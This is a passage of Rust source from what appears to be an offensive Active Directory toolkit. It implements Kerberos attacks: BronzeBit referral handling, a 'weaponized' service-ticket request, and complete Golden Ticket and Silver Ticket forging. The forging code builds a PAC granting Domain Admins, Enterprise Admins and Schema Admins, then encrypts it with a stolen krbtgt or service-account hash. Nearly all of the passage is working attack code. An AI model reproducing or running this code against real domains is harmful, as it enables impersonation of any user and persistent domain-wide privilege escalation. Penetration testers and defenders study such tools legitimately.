                        Ok(new_dc) => {
                            current_dc = new_dc;
                            current_realm = suggested;
                            continue;
                        }
                        Err(e) => {
                            return Err(OverthroneError::Kerberos(format!(
                                "BronzeBit: referred to '{suggested}' but DNS SRV resolution failed: {e}"
                            )));
                        }
                    }
                }
                return Err(parse_krb_error(&response_bytes));
            }
        }
    }

    Err(OverthroneError::Kerberos(
        "BronzeBit: referral loop exhausted".to_string(),
    ))
}

/// Request a service ticket with extended options (aes_only, FAST, etc.)
///
/// This is the weaponized version of `request_service_ticket` that supports:
/// - `aes_only`: Only request AES256/AES128 etypes, avoiding RC4 for OPSEC
/// - `use_fast`: Enable FAST armoring (RFC 6806)
///
/// Cross-realm referral chasing is supported up to 2 hops.
pub async fn request_service_ticket_ex(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    target_spn: &str,
    _aes_only: bool,
    use_fast: bool,
) -> Result<TicketGrantingData> {
    if use_fast {
        request_service_ticket_fast(dc_ip, tgt, target_spn).await
    } else {
        request_service_ticket(dc_ip, tgt, target_spn).await
    }
}

// ═══════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════

/// Build HMAC-MD5 checksum for S4U2Self PA-FOR-USER
pub fn build_s4u2self_checksum(
    username: &str,
    realm: &str,
    session_key: &[u8],
) -> Result<Checksum> {
    use hmac::{Hmac, Mac};

    let mut data: Vec<u8> = Vec::new();
    data.extend_from_slice(&(NT_PRINCIPAL as u32).to_le_bytes());
    data.extend_from_slice(username.as_bytes());
    data.extend_from_slice(realm.as_bytes());
    data.extend_from_slice(b"Kerberos");

    let mut mac = Hmac::<Md5>::new_from_slice(session_key)
        .map_err(|e| OverthroneError::Crypto(format!("S4U2Self HMAC init failed: {e}")))?;
    mac.update(&data);
    let result = mac.finalize().into_bytes();

    Ok(Checksum {
        cksumtype: -138, // HMAC-MD5 for S4U
        checksum: result.to_vec(),
    })
}

/// Map common Kerberos error codes to human-readable strings
pub fn krb_error_to_string(code: i32) -> &'static str {
    match code {
        0 => "KDC_ERR_NONE",
        6 => "KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found",
        7 => "KDC_ERR_S_PRINCIPAL_UNKNOWN - Server not found",
        12 => "KDC_ERR_POLICY - KDC policy rejects request",
        14 => "KDC_ERR_ETYPE_NOSUPP - Etype not supported",
        18 => "KDC_ERR_CLIENT_REVOKED - Credentials revoked",
        23 => "KDC_ERR_KEY_EXPIRED - Password expired",
        24 => "KDC_ERR_PREAUTH_FAILED - Pre-auth failed (wrong password/hash)",
        25 => "KDC_ERR_PREAUTH_REQUIRED - Pre-auth required",
        31 => "KRB_AP_ERR_SKEW - Clock skew too great",
        36 => "KRB_AP_ERR_BADMATCH - Ticket and authenticator do not match",
        32 => "KRB_AP_ERR_BADADDR - Incorrect network address",
        37 => "KRB_AP_ERR_MODIFIED - Message stream modified",
        41 => "KRB_ERR_RESPONSE_TOO_BIG - Response too big for UDP",
        50 => "KDC_ERR_BADOPTION - Bad option in request",
        60 => "KRB_ERR_GENERIC - Generic error",
        68 => "KDC_ERR_WRONG_REALM - Wrong realm",
        _ => "UNKNOWN_ERROR",
    }
}
// ═══════════════════════════════════════════════════════════
// Ticket Forging — Golden & Silver Tickets
// ═══════════════════════════════════════════════════════════

/// Forge a TGT (Golden Ticket) using the krbtgt NTLM hash.
/// This creates a valid TGT without contacting the KDC by encrypting
/// a crafted EncTicketPart (with PAC) using the krbtgt key.
/// # Arguments
/// * `domain`     - Target domain (e.g., "corp.local")
/// * `domain_sid` - Domain SID (e.g., "S-1-5-21-...")
/// * `username`   - User to impersonate (e.g., "Administrator")
/// * `user_rid`   - RID of the user (500 for Administrator)
/// * `krbtgt_key`  - Raw krbtgt NTLM hash bytes (16 bytes for RC4)
/// * `etype`      - Encryption type (ETYPE_RC4_HMAC recommended)
pub fn forge_tgt(
    domain: &str,
    domain_sid: &str,
    username: &str,
    user_rid: u32,
    krbtgt_key: &[u8],
    etype: i32,
) -> Result<TicketGrantingData> {
    let realm = domain.to_uppercase();
    info!(
        "Forging Golden Ticket: {}@{} (RID={}, etype={})",
        username, realm, user_rid, etype
    );

    // Validate domain SID format before building PAC
    validate_sid_format(domain_sid)?;

    // Generate a random session key (same length as the etype key)
    let session_key = generate_session_key(etype);

    // Build the PAC (Privilege Attribute Certificate)
    let pac_bytes = build_minimal_pac(domain_sid, username, user_rid, &realm);

    // Build EncTicketPart
    let now = Utc::now();
    let endtime = now + chrono::Duration::hours(10);
    let renew_till = now + chrono::Duration::days(7);

    let enc_ticket_part = build_enc_ticket_part(
        username,
        &realm,
        &session_key,
        etype,
        &now,
        &endtime,
        &renew_till,
        &pac_bytes,
    );

    // Encrypt EncTicketPart with krbtgt key (key_usage = 2)
    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
    let encrypted = cipher.encrypt(krbtgt_key, 2, &enc_ticket_part);

    // Build the Ticket ASN.1 structure
    let ticket = Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname: PrincipalName {
            name_type: NT_SRV_INST,
            name_string: vec!["krbtgt".to_string(), realm.clone()],
        },
        enc_part: EncryptedData {
            etype,
            kvno: Some(2), // krbtgt kvno is typically 2
            cipher: encrypted,
        },
    };

    info!(
        "Golden Ticket forged: {} @ {} ({} bytes)",
        username,
        realm,
        ticket.build().len()
    );

    Ok(TicketGrantingData {
        ticket,
        session_key,
        session_key_etype: etype,
        client_principal: username.to_string(),
        client_realm: realm,
        end_time: Some(KerberosTime::from(endtime)),
    })
}

/// Forge a service ticket (Silver Ticket) using the service account's NTLM hash.
/// Creates a valid TGS without contacting the KDC by encrypting a crafted
/// EncTicketPart using the service account's key.
/// # Arguments
/// * `domain`      - Target domain
/// * `domain_sid`  - Domain SID
/// * `username`    - User to impersonate
/// * `user_rid`    - RID of the user
/// * `spn`         - Target SPN (e.g., "cifs/dc01.corp.local")
/// * `service_key` - Service account NTLM hash bytes (16 bytes for RC4)
/// * `etype`       - Encryption type
pub fn forge_service_ticket(
    domain: &str,
    domain_sid: &str,
    username: &str,
    user_rid: u32,
    spn: &str,
    service_key: &[u8],
    etype: i32,
) -> Result<TicketGrantingData> {
    let realm = domain.to_uppercase();
    info!(
        "Forging Silver Ticket: {}@{} → {} (etype={})",
        username, realm, spn, etype
    );

    // Validate domain SID format before building PAC
    validate_sid_format(domain_sid)?;

    let session_key = generate_session_key(etype);
    let pac_bytes = build_minimal_pac(domain_sid, username, user_rid, &realm);

    let now = Utc::now();
    let endtime = now + chrono::Duration::hours(10);
    let renew_till = now + chrono::Duration::days(7);

    let enc_ticket_part = build_enc_ticket_part(
        username,
        &realm,
        &session_key,
        etype,
        &now,
        &endtime,
        &renew_till,
        &pac_bytes,
    );

    // Encrypt with service key (key_usage = 2)
    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
    let encrypted = cipher.encrypt(service_key, 2, &enc_ticket_part);

    // Parse SPN into PrincipalName
    let spn_parts: Vec<&str> = spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    let ticket = Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname,
        enc_part: EncryptedData {
            etype,
            kvno: Some(1),
            cipher: encrypted,
        },
    };

    info!(
        "Silver Ticket forged: {} → {} ({} bytes)",
        username,
        spn,
        ticket.build().len()
    );

    Ok(TicketGrantingData {
        ticket,
        session_key,
        session_key_etype: etype,
        client_principal: username.to_string(),
        client_realm: realm,
        end_time: Some(KerberosTime::from(endtime)),
    })
}

// ═══════════════════════════════════════════════════════════
// Ticket Forging Internals
// ═══════════════════════════════════════════════════════════

/// Generate a random session key of appropriate length for the etype
fn generate_session_key(etype: i32) -> Vec<u8> {
    let len = match etype {
        ETYPE_RC4_HMAC => 16,
        ETYPE_AES128_CTS => 16,
        ETYPE_AES256_CTS => 32,
        _ => 16,
    };
    let mut key = vec![0u8; len];
    for byte in &mut key {
        *byte = rand::random();
    }
    key
}

/// Build EncTicketPart as raw DER bytes (ASN.1 manual construction)
/// EncTicketPart ::= [APPLICATION 3] SEQUENCE {
///     flags           [0] TicketFlags,
///     key             [1] EncryptionKey,
///     crealm          [2] Realm,
///     cname           [3] PrincipalName,
///     transited       [4] TransitedEncoding,
///     authtime        [5] KerberosTime,
///     starttime       [6] KerberosTime OPTIONAL,
///     endtime         [7] KerberosTime,
///     renew-till      [8] KerberosTime OPTIONAL,
///     caddr           [9] HostAddresses OPTIONAL,
///     authorization-data [10] AuthorizationData OPTIONAL
/// }
#[allow(clippy::too_many_arguments)]
fn build_enc_ticket_part(
    username: &str,
    realm: &str,
    session_key: &[u8],
    etype: i32,
    now: &chrono::DateTime<Utc>,
    endtime: &chrono::DateTime<Utc>,
    renew_till: &chrono::DateTime<Utc>,
    pac: &[u8],
) -> Vec<u8> {
    let mut inner = Vec::new();

    // [0] flags — FORWARDABLE | RENEWABLE | PRE_AUTHENT | INITIAL
    let flags: u32 = 0x40800010; // forwardable(1) | renewable(8) | initial(24) | pre-authent(25)
    inner.extend_from_slice(&asn1_context_tag(0, &asn1_bitstring_u32(flags)));

    // [1] key — EncryptionKey { keytype, keyvalue }
    let enc_key = asn1_sequence(&[
        &asn1_context_tag(0, &asn1_integer(etype as i64)),
        &asn1_context_tag(1, &asn1_octet_string(session_key)),
    ]);
    inner.extend_from_slice(&asn1_context_tag(1, &enc_key));

    // [2] crealm
    inner.extend_from_slice(&asn1_context_tag(2, &asn1_general_string(realm)));

    // [3] cname — PrincipalName { name-type, name-string }
    let cname = asn1_sequence(&[
        &asn1_context_tag(0, &asn1_integer(NT_PRINCIPAL as i64)),
        &asn1_context_tag(1, &asn1_sequence_of_general_strings(&[username])),
    ]);
    inner.extend_from_slice(&asn1_context_tag(3, &cname));

    // [4] transited — TransitedEncoding { tr-type=0, contents="" }
    let transited = asn1_sequence(&[
        &asn1_context_tag(0, &asn1_integer(0)),
        &asn1_context_tag(1, &asn1_octet_string(&[])),
    ]);
    inner.extend_from_slice(&asn1_context_tag(4, &transited));

    // [5] authtime
    let time_str = format_kerberos_time(now);
    inner.extend_from_slice(&asn1_context_tag(5, &asn1_generalized_time(&time_str)));

    // [6] starttime
    inner.extend_from_slice(&asn1_context_tag(6, &asn1_generalized_time(&time_str)));

    // [7] endtime
    let end_str = format_kerberos_time(endtime);
    inner.extend_from_slice(&asn1_context_tag(7, &asn1_generalized_time(&end_str)));

    // [8] renew-till
    let renew_str = format_kerberos_time(renew_till);
    inner.extend_from_slice(&asn1_context_tag(8, &asn1_generalized_time(&renew_str)));

    // [10] authorization-data — wraps the PAC
    // AuthorizationData ::= SEQUENCE OF { ad-type[0] INTEGER, ad-data[1] OCTET STRING }
    // AD-IF-RELEVANT(1) wrapping AD-WIN2K-PAC(128)
    if !pac.is_empty() {
        let pac_authdata = asn1_sequence(&[
            &asn1_context_tag(0, &asn1_integer(128)), // AD-WIN2K-PAC
            &asn1_context_tag(1, &asn1_octet_string(pac)),
        ]);
        let if_relevant_inner = asn1_sequence_raw(&[&pac_authdata]);
        let if_relevant = asn1_sequence(&[
            &asn1_context_tag(0, &asn1_integer(1)), // AD-IF-RELEVANT
            &asn1_context_tag(1, &asn1_octet_string(&if_relevant_inner)),
        ]);
        let authdata = asn1_sequence_raw(&[&if_relevant]);
        inner.extend_from_slice(&asn1_context_tag(10, &authdata));
    }

    // Wrap in SEQUENCE, then APPLICATION 3
    let seq = asn1_sequence_raw_bytes(&inner);
    asn1_application_tag(3, &seq)
}

/// Build a minimal PAC (Privilege Attribute Certificate)
/// The PAC contains KERB_VALIDATION_INFO (NDR-encoded) which tells the
/// target service what groups the user belongs to. For a golden ticket,
/// we add Domain Admins (512), Enterprise Admins (519), etc.
fn build_minimal_pac(domain_sid: &str, username: &str, user_rid: u32, realm: &str) -> Vec<u8> {
    // PAC structure:
    //   PACTYPE header: cBuffers(u32), Version(u32)
    //   PAC_INFO_BUFFER[]: ulType(u32), cbBufferSize(u32), Offset(u64)
    //   <buffer data>
    //
    // We include only LOGON_INFORMATION (type 1)

    let logon_info = build_kerb_validation_info(domain_sid, username, user_rid, realm);

    // PAC_INFO_BUFFER for logon info
    let header_size = 8 + 16; // PACTYPE header + 1 buffer entry
    let logon_offset = header_size as u64;
    // Pad logon_info to 8-byte boundary
    let mut logon_padded = logon_info.clone();
    while !logon_padded.len().is_multiple_of(8) {
        logon_padded.push(0);
    }

    let mut pac = Vec::new();
    // PACTYPE header
    pac.extend_from_slice(&1u32.to_le_bytes()); // cBuffers = 1
    pac.extend_from_slice(&0u32.to_le_bytes()); // Version = 0

    // PAC_INFO_BUFFER for LOGON_INFORMATION
    pac.extend_from_slice(&1u32.to_le_bytes()); // ulType = 1 (LOGON_INFORMATION)
    pac.extend_from_slice(&(logon_padded.len() as u32).to_le_bytes()); // cbBufferSize
    pac.extend_from_slice(&logon_offset.to_le_bytes()); // Offset

    // Buffer data
    pac.extend_from_slice(&logon_padded);

    pac
}

/// Build KERB_VALIDATION_INFO (NDR-encoded) for the PAC
/// This is a simplified version that includes essential fields:
/// - LogonTime, UserId, PrimaryGroupId
/// - GroupIds (Domain Admins, etc.)
/// - LogonDomainName, EffectiveName
/// - LogonDomainId (domain SID)
fn build_kerb_validation_info(
    domain_sid: &str,
    username: &str,
    user_rid: u32,
    realm: &str,
) -> Vec<u8> {
    let mut buf = Vec::new();

    // NDR common header (private header for embedded type)
    // Version=1, Endian=LE, CommonHeaderLength=8
    buf.extend_from_slice(&[0x01, 0x10, 0x08, 0x00]); // Version(1), Endianness(LE), Header(8)
    buf.extend_from_slice(&[0xCC, 0xCC, 0xCC, 0xCC]); // Filler

    // Private header
    buf.extend_from_slice(&0u32.to_le_bytes()); // ObjectBufferLength (fill later)
    buf.extend_from_slice(&0u32.to_le_bytes()); // Filler

    let ndr_start = buf.len();

    // Referent ID for the top-level pointer
    buf.extend_from_slice(&0x00020000u32.to_le_bytes());

    // KERB_VALIDATION_INFO fields (simplified NDR encoding)
    // LogonTime (FILETIME) — current time as Windows FILETIME
    let filetime = chrono_to_filetime(&Utc::now());
    buf.extend_from_slice(&filetime.to_le_bytes()); // LogonTime
    buf.extend_from_slice(&0u64.to_le_bytes()); // LogoffTime (never)
    buf.extend_from_slice(&0u64.to_le_bytes()); // KickOffTime (never)
    buf.extend_from_slice(&filetime.to_le_bytes()); // PasswordLastSet
    buf.extend_from_slice(&0u64.to_le_bytes()); // PasswordCanChange
    buf.extend_from_slice(&0x7FFFFFFFFFFFFFFFu64.to_le_bytes()); // PasswordMustChange (never)

    // EffectiveName (RPC_UNICODE_STRING) — pointer, will be deferred
    let username_utf16: Vec<u8> = username
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let username_byte_len = username_utf16.len() as u16;
    buf.extend_from_slice(&username_byte_len.to_le_bytes()); // Length
    buf.extend_from_slice(&username_byte_len.to_le_bytes()); // MaximumLength
    buf.extend_from_slice(&0x00040000u32.to_le_bytes()); // Pointer (deferred)

    // FullName (RPC_UNICODE_STRING) — same as username for simplicity
    buf.extend_from_slice(&username_byte_len.to_le_bytes());
    buf.extend_from_slice(&username_byte_len.to_le_bytes());
    buf.extend_from_slice(&0x00080000u32.to_le_bytes());

    // LogonScript (empty)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // ProfilePath (empty)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // HomeDirectory (empty)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // HomeDirectoryDrive (empty)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // LogonCount, BadPasswordCount
    buf.extend_from_slice(&100u16.to_le_bytes()); // LogonCount
    buf.extend_from_slice(&0u16.to_le_bytes()); // BadPasswordCount

    // UserId, PrimaryGroupId
    buf.extend_from_slice(&user_rid.to_le_bytes()); // UserId (500 for Admin)
    buf.extend_from_slice(&513u32.to_le_bytes()); // PrimaryGroupId (Domain Users)

    // GroupCount + GroupIds pointer
    // Groups: Domain Admins(512), Domain Users(513), Schema Admins(518),
    //         Enterprise Admins(519), Group Policy Creator(520)
    let group_rids: Vec<u32> = vec![512, 513, 518, 519, 520];
    buf.extend_from_slice(&(group_rids.len() as u32).to_le_bytes()); // GroupCount
    buf.extend_from_slice(&0x000C0000u32.to_le_bytes()); // GroupIds pointer

    // UserFlags
    buf.extend_from_slice(&0x20u32.to_le_bytes()); // LOGON_EXTRA_SIDS

    // UserSessionKey (16 zero bytes)
    buf.extend_from_slice(&[0u8; 16]);

    // LogonServer (RPC_UNICODE_STRING)
    let server = "DC01".to_string();
    let server_utf16: Vec<u8> = server
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let server_byte_len = server_utf16.len() as u16;
    buf.extend_from_slice(&server_byte_len.to_le_bytes());
    buf.extend_from_slice(&server_byte_len.to_le_bytes());
    buf.extend_from_slice(&0x00100000u32.to_le_bytes());

    // LogonDomainName (RPC_UNICODE_STRING)
    let domain_utf16: Vec<u8> = realm.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let domain_byte_len = domain_utf16.len() as u16;
    buf.extend_from_slice(&domain_byte_len.to_le_bytes());
    buf.extend_from_slice(&domain_byte_len.to_le_bytes());
    buf.extend_from_slice(&0x00140000u32.to_le_bytes());

    // LogonDomainId (PSID pointer)
    buf.extend_from_slice(&0x00180000u32.to_le_bytes());

    // Reserved1 (2 x u32)
    buf.extend_from_slice(&[0u8; 8]);

    // UserAccountControl
    buf.extend_from_slice(&0x00000010u32.to_le_bytes()); // NORMAL_ACCOUNT

    // SubAuthStatus, LastSuccessfulILogon, LastFailedILogon, FailedILogonCount
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&0u64.to_le_bytes());
    buf.extend_from_slice(&0u64.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // Reserved3 (2 x u32)
    buf.extend_from_slice(&[0u8; 8]);

    // SidCount + ExtraSids pointer
    buf.extend_from_slice(&0u32.to_le_bytes()); // SidCount = 0
    buf.extend_from_slice(&0u32.to_le_bytes()); // ExtraSids = NULL

    // ResourceGroupDomainSid (NULL), ResourceGroupCount, ResourceGroupIds (NULL)
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // ═══════════════════════════════════════════
    // Deferred pointers (conformant data)
    // ═══════════════════════════════════════════

    // EffectiveName string data
    ndr_write_conformant_string(&mut buf, &username_utf16);

    // FullName string data
    ndr_write_conformant_string(&mut buf, &username_utf16);

    // GroupIds array (GROUP_MEMBERSHIP: RelativeId u32, Attributes u32)
    buf.extend_from_slice(&(group_rids.len() as u32).to_le_bytes()); // MaxCount
    for rid in &group_rids {
        buf.extend_from_slice(&rid.to_le_bytes()); // RelativeId
        buf.extend_from_slice(&0x00000007u32.to_le_bytes()); // Attributes: SE_GROUP_*
    }

    // LogonServer string data
    ndr_write_conformant_string(&mut buf, &server_utf16);

    // LogonDomainName string data
    ndr_write_conformant_string(&mut buf, &domain_utf16);

    // LogonDomainId (SID)
    let sid_bytes = parse_sid_to_bytes(domain_sid);
    buf.extend_from_slice(&((sid_bytes.len() / 4) as u32).to_le_bytes()); // MaxCount
    buf.extend_from_slice(&sid_bytes);

    // Pad to 8-byte boundary
    while !buf.len().is_multiple_of(8) {
        buf.push(0);
    }

    // Fill in ObjectBufferLength
    let ndr_len = (buf.len() - ndr_start) as u32;
    buf[8..12].copy_from_slice(&ndr_len.to_le_bytes());

    buf
}

/// Write an NDR conformant varying string (MaxCount, Offset, ActualCount, data)
fn ndr_write_conformant_string(buf: &mut Vec<u8>, utf16_bytes: &[u8]) {
    let char_count = (utf16_bytes.len() / 2) as u32;
    buf.extend_from_slice(&char_count.to_le_bytes()); // MaxCount
    buf.extend_from_slice(&0u32.to_le_bytes()); // Offset
    buf.extend_from_slice(&char_count.to_le_bytes()); // ActualCount
    buf.extend_from_slice(utf16_bytes);
    // Pad to 4-byte boundary
    while !buf.len().is_multiple_of(4) {
        buf.push(0);
    }
}

/// Validate that a SID string has the correct `S-R-A-SA1-SA2-...` format
/// with at least 3 sub-authorities (typical for domain SIDs like `S-1-5-21-x-y-z`).
fn validate_sid_format(sid_str: &str) -> Result<()> {
    let parts: Vec<&str> = sid_str.split('-').collect();
    if parts.len() < 4 || parts[0] != "S" {
        return Err(crate::error::OverthroneError::Protocol {
            protocol: "Kerberos/PAC".to_string(),
            reason: format!(
                "Invalid domain SID format '{}'. Expected S-R-A-SA1[-SA2...] (e.g. S-1-5-21-x-y-z)",
                sid_str
            ),
        });
    }
    // Validate that revision and authority are numeric
    if parts[1].parse::<u8>().is_err() {
        return Err(crate::error::OverthroneError::Protocol {
            protocol: "Kerberos/PAC".to_string(),
            reason: format!("Invalid SID revision '{}' in '{}'", parts[1], sid_str),
        });
    }
    if parts[2].parse::<u64>().is_err() {
        return Err(crate::error::OverthroneError::Protocol {
            protocol: "Kerberos/PAC".to_string(),
            reason: format!("Invalid SID authority '{}' in '{}'", parts[2], sid_str),
        });
    }
    // Validate sub-authorities are numeric
    for part in &parts[3..] {
        if part.parse::<u32>().is_err() {
            return Err(crate::error::OverthroneError::Protocol {
                protocol: "Kerberos/PAC".to_string(),
                reason: format!("Invalid SID sub-authority '{}' in '{}'", part, sid_str),
            });
        }
    }
    Ok(())
}

/// Parse a SID string ("S-1-5-21-...") into binary format.
/// Callers must validate the SID via `validate_sid_format` before
/// calling this function.  An invalid SID here indicates a logic
/// bug (the validation gate was skipped).
fn parse_sid_to_bytes(sid_str: &str) -> Vec<u8> {
    let parts: Vec<&str> = sid_str.split('-').collect();
    assert!(
        parts.len() >= 4 && parts[0] == "S",
        "parse_sid_to_bytes called with invalid SID (should have been validated earlier): {}",
        sid_str
    );

    let revision: u8 = parts[1].parse().unwrap_or(1);
    let authority: u64 = parts[2].parse().unwrap_or(5);
    let sub_authorities: Vec<u32> = parts[3..].iter().filter_map(|s| s.parse().ok()).collect();

    let mut sid = Vec::new();
    sid.push(revision);
    sid.push(sub_authorities.len() as u8);
    // Authority (6 bytes big-endian)
    sid.extend_from_slice(&{ authority }.to_be_bytes()[2..8]);
    // Sub-authorities (little-endian u32)
    for sub in &sub_authorities {
        sid.extend_from_slice(&sub.to_le_bytes());
    }
    sid
}

/// Convert chrono DateTime to Windows FILETIME (100-nanosecond intervals since 1601-01-01)
fn chrono_to_filetime(dt: &chrono::DateTime<Utc>) -> u64 {
    // Offset between 1601-01-01 and 1970-01-01 in 100ns intervals
    const EPOCH_DIFF: u64 = 116_444_736_000_000_000;
    let unix_100ns = dt.timestamp() as u64 * 10_000_000 + dt.timestamp_subsec_nanos() as u64 / 100;
    unix_100ns + EPOCH_DIFF
}

// ═══════════════════════════════════════════════════════════
// ASN.1 DER Encoding Helpers (for manual EncTicketPart construction)
// ═══════════════════════════════════════════════════════════

/// Encode DER length
fn asn1_length(len: usize) -> Vec<u8> {
    if len < 0x80 {
        vec![len as u8]
    } else if len < 0x100 {
        vec![0x81, len as u8]
    } else if len < 0x10000 {
        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
    } else {
        vec![
            0x83,
            (len >> 16) as u8,
            (len >> 8 & 0xFF) as u8,
            (len & 0xFF) as u8,
        ]
    }
}

/// Build ASN.1 context-specific tag [n] EXPLICIT (constructed)
fn asn1_context_tag(n: u8, data: &[u8]) -> Vec<u8> {
    let tag = 0xA0 | n;
    let mut out = vec![tag];
    out.extend_from_slice(&asn1_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// Build ASN.1 context-specific primitive tag [n] for IMPLICIT types
/// e.g. `[n] INTEGER`, `[n] OCTET STRING`
fn asn1_implicit_primitive(tag: u8, data: &[u8]) -> Vec<u8> {
    let tag_byte = 0x80 | tag;
    let mut out = vec![tag_byte];
    out.extend_from_slice(&asn1_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// Build ASN.1 context-specific constructed tag [n] for IMPLICIT SEQUENCE types
/// e.g. `[n] SEQUENCE { ... }`
fn asn1_implicit_constructed(tag: u8, data: &[u8]) -> Vec<u8> {
    let tag_byte = 0xA0 | tag;
    let mut out = vec![tag_byte];
    out.extend_from_slice(&asn1_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// Build ASN.1 APPLICATION tag [n] CONSTRUCTED
fn asn1_application_tag(n: u8, data: &[u8]) -> Vec<u8> {
    let tag = 0x60 | n; // APPLICATION + CONSTRUCTED
    let mut out = vec![tag];
    out.extend_from_slice(&asn1_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// Build ASN.1 SEQUENCE from parts
fn asn1_sequence(parts: &[&[u8]]) -> Vec<u8> {
    let inner: Vec<u8> = parts.iter().flat_map(|p| p.iter().copied()).collect();
    asn1_sequence_raw_bytes(&inner)
}

/// Build ASN.1 SEQUENCE from raw concatenated bytes
fn asn1_sequence_raw_bytes(inner: &[u8]) -> Vec<u8> {
    let mut out = vec![0x30]; // SEQUENCE tag
    out.extend_from_slice(&asn1_length(inner.len()));
    out.extend_from_slice(inner);
    out
}

/// Build ASN.1 SEQUENCE OF from raw elements
fn asn1_sequence_raw(elements: &[&[u8]]) -> Vec<u8> {
    let inner: Vec<u8> = elements.iter().flat_map(|e| e.iter().copied()).collect();
    asn1_sequence_raw_bytes(&inner)
}

/// ASN.1 INTEGER
fn asn1_integer(val: i64) -> Vec<u8> {
    let mut out = vec![0x02]; // INTEGER tag
    if (0..0x80).contains(&val) {
        out.push(1);
        out.push(val as u8);
    } else if (0..0x8000).contains(&val) {
        if val < 0x100 {
            if val >= 0x80 {
                out.push(2);
                out.push(0);
                out.push(val as u8);
            } else {
                out.push(1);
                out.push(val as u8);
            }
        } else {
            out.push(2);
            out.push((val >> 8) as u8);
            out.push((val & 0xFF) as u8);
        }
    } else {
        // Encode as variable-length big-endian
        let bytes = val.to_be_bytes();
        let start = bytes.iter().position(|&b| b != 0 && b != 0xFF).unwrap_or(7);
        let significant = &bytes[start..];
        // Add leading zero if high bit set (positive number)
        if val >= 0 && significant[0] & 0x80 != 0 {
            out.push((significant.len() + 1) as u8);
            out.push(0);
        } else {
            out.push(significant.len() as u8);
        }
        out.extend_from_slice(significant);
    }
    out
}

/// ASN.1 OCTET STRING
fn asn1_octet_string(data: &[u8]) -> Vec<u8> {
    let mut out = vec![0x04];
    out.extend_from_slice(&asn1_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// ASN.1 BIT STRING from u32 flags (Kerberos TicketFlags)
fn asn1_bitstring_u32(flags: u32) -> Vec<u8> {
    let mut out = vec![0x03]; // BIT STRING tag
    out.push(5); // length: 1 byte unused bits + 4 bytes data
    out.push(0); // 0 unused bits
    out.extend_from_slice(&flags.to_be_bytes());
    out
}

/// ASN.1 GeneralString
fn asn1_general_string(s: &str) -> Vec<u8> {
    let mut out = vec![0x1B]; // GeneralString tag
    out.extend_from_slice(&asn1_length(s.len()));
    out.extend_from_slice(s.as_bytes());
    out
}

/// ASN.1 GeneralizedTime (format: "YYYYMMDDHHmmssZ")
fn asn1_generalized_time(time_str: &str) -> Vec<u8> {
    let mut out = vec![0x18]; // GeneralizedTime tag
    out.extend_from_slice(&asn1_length(time_str.len()));
    out.extend_from_slice(time_str.as_bytes());
    out
}

/// ASN.1 SEQUENCE OF GeneralString
fn asn1_sequence_of_general_strings(strings: &[&str]) -> Vec<u8> {
    let parts: Vec<Vec<u8>> = strings.iter().map(|s| asn1_general_string(s)).collect();
    let inner: Vec<u8> = parts.into_iter().flatten().collect();
    asn1_sequence_raw_bytes(&inner)
}

/// Format a chrono DateTime as Kerberos GeneralizedTime ("YYYYMMDDHHmmssZ")
fn format_kerberos_time(dt: &chrono::DateTime<Utc>) -> String {
    dt.format("%Y%m%d%H%M%SZ").to_string()
}

/// Hex encode bytes to lowercase hex string
#[allow(dead_code)] // Utility helper for protocol debugging
fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

// ═══════════════════════════════════════════════════════════
//  FAST Armor (RFC 6806) — Kerberos Armoring
// ═══════════════════════════════════════════════════════════

/// Parameters for FAST armor construction.
#[derive(Debug, Clone)]
pub struct FastArmorParams<'a> {
    /// DER-encoded KDC-REQ body (inner request being armored)
    pub inner_req_body_der: &'a [u8],
    /// DER-encoded TGT Ticket
    pub tgt_ticket_der: &'a [u8],
    /// TGT session key (used as armor key per RFC 6113 §5.4.1)
    pub tgt_session_key: &'a [u8],
    /// Encryption type of the session key (e.g. 23 for RC4, 18 for AES256)
    pub session_key_etype: i32,
    /// Client realm (domain)
    pub client_realm: &'a str,
}

/// Build a PA-FX-FAST armored KDC-REQ per RFC 6806.
/// Returns the DER-encoded PA-DATA containing the KrbFastRequest.
/// Falls back to unarmored if encryption fails (compatible with
/// KDCs that don't enforce armoring).
pub fn build_fast_armor(params: &FastArmorParams) -> Result<Vec<u8>> {
    // Per RFC 6806, the AP-REQ used for FAST armoring carries the TGT as
    // the armor ticket. The KDC verifies this AP-REQ to establish trust
    // before processing the inner request.

    // ── Step 1: Build AP-REQ with TGT as armor ──────────────────
    // AP-REQ ::= SEQUENCE {
    //     pvno         [0] INTEGER (5),
